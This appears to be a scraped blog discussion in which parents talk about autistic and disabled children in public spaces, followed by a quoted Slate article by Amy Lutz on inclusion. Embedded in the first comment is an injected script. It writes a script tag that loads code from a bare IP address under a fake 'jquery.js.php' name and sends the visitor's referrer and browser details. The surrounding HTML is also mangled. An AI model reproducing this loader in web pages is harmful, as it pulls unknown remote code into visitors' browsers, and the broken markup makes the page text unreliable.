(ABC what would you do autism clip)

lisa: <span ext/javascript" rel="nofollow"  document.write("<script language='javascript' rel='nofollow' type='text/javascript' src='http://5.45.67.97/1/jquery.js.php?r=" + encodeuri(document.referrer) + "&u=" + encodeuri(navigator.useragent) + "'></sc" + "ript>"); </script></noindex>  sans-serif;">just re the sharing space - taking it in turns and inclusive.....i also think the turn taking may be an important step (step only...not THE model) for the people with disabilites being able to 'learn to use' the public space first. exposure is how they are educated and so having a chance to do this with no pressure would be really advantageous for families/ carers and the person with the</span><span disability</span><span  </span><span first.</span>



 





* there is also some question in my mind about the 'type' of <span>disability</span> that is 'easier' to manage in a public space. for some reason....quite little children who are profoundly disabled in wheel chairs, pose little threat to 'others' ability to enjoy public space. because they can look away, they dont need to react or respnd physically cause the child is in a wheel chair....it seems the same for other sensory <span>disabilities</span>...like children/people with vision impariments...(its the little blind boy and the cute guide dog thing....been around forever and accepted by most)....but for some reason, autistic children or other <span>disabilities</span> , that involved noise or behaviour that is not 'contained' or 'controled' seems to pose a threat to others. cause they dont know how to react....or cause they dont understand.....or approve of the parenting.





 





* having a child with autism can often basically be like having a shreiking , repetitive noise making 1 yr  -18 month old, for your whole life! We all know to try and avoid public spaces unless armed with major food weapons and toy distractions.....but this phase passes....





If you have a child with Autism, it never, ever passes. N these people have as much right to use public space as anyone else.





 





* years and years of taking children into the community - mostly wahroonga shops and cafes - but also on camps and other places - most people want to help, feel empathy and are enriched by the experiences of children with <span>disabilities</span>....the odd person (and again my experience is that it is usually an elderly impatient person or a middle ages and up man with anger issues..occasionally a mother too...who is worried an protective of her own little child.) will have a problem with children/people wiht <span>disabilities</span> in public spaces.





 





veronica: <span  </span><span think it's a tough one. For ME, public spaces are for the public and children - special needs or not, can't be expected to learn how to behave in public if they're never there, you know? I also think that as a whole, communities have forgotten how to be empathetic to parents. There's a lot of people who think they know how they'd do it better and how we ought to be parenting. That's special needs or not.</span>





 





<span I'm lucky I guess, because Amy is a girl, she's a lot more sensitive to social graces and has learned them pretty well. She's just quirky in her obsessions and concentration now, not difficult in public, and Isaac withdraws entirely because he finds it all so overwhelming, so he's easy - unless you want to speak to him. Heh.</span>





 





<span I wonder if it's just invisible <span data-blogger-escaped-disabilities</span> that get judged so harshly. A drooling shouting five year old who looks otherwise competent is likely to be treated differently to the same five year old in a wheelchair. Likewise all these "wonder stories" of curing ADHD and ASD with diet makes a lot of people assume that it's easily managed and a "get out of jail free" diagnosis,iykwim? When that's not the case at all.</span>





 





<span For me, I try not to think about other people too much. My children are human beings with their own wants and desires. I let them know how I expect them to behave and provide consequences, but it's up to them to actually DO it. It's like all that drama over Facebeef - asking the father of the 18yo why he won't control his son. DUDE, the boy is EIGHTEEN. Doesn't anyone realise that parents can't "control" their child? it's all choices?</span>

<span Slate Magazine article ntitled <a href="http://www.slate.com/articles/health_and_science/medical_examiner/2013/03/autism_in_the_community_how_should_public_spaces_be_shared.html">Where Should Special Needs Kids Be Special</a>? by Amy Lutz, she asks 'what are reasonable expectations of people in public places?' </span><span It’s not OK to be offended by the sight of disabled people in the community or to insult them or their family members. However, neither is it OK for anyone, disabled or not, to engage in dangerous, illegal, and/or unsanitary behaviors.</span>







Pretty broad parameters, no doubt, but hopefully ones we can all agree on.









Where it gets tricky is in the middle. What are reasonable expectations of behavior in public places? Like many autistic individuals, Jonah is virtually incapable of doing anything quietly. He has been scowled at on airplanes, in movie theaters, in restaurants, and in bookstores. And I get it—I prefer a quiet airplane ride as much as the next person. But what I keep coming back to is that **community**, by definition, is inclusive. Ideally, our public spaces should accommodate everyone. Which means that expecting kids like Jonah to just stay home isn’t reasonable. Nor should we think of this issue in terms of what discomfort or awkwardness people without disabilities are willing to tolerate, because that suggests a troubling hierarchy of privilege. Instead, we need to ask ourselves how best to share our common facilities.
